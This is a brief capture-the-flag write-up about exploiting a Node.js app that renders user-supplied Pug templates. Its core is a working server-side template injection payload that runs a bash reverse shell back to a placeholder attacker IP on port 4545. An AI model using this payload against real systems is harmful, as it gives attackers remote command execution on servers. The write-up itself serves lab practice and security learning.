# Port Scan
![](Assets/Template1.png)
Visiting The webpage I have found <br/>
![](Assets/Template2.png)
Node.js template engine pug is running taking pug code converting it to HTML. <br/>
I uploaded a reverse shell and got the shell and flag. <br/>
```
doctype html
head
  title #{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('bash -c "sh -i >& /dev/tcp/<attacker_ip>/4545 0>&1"')}()}
```
![](Assets/Template3.png)
![](Assets/Template4.png)
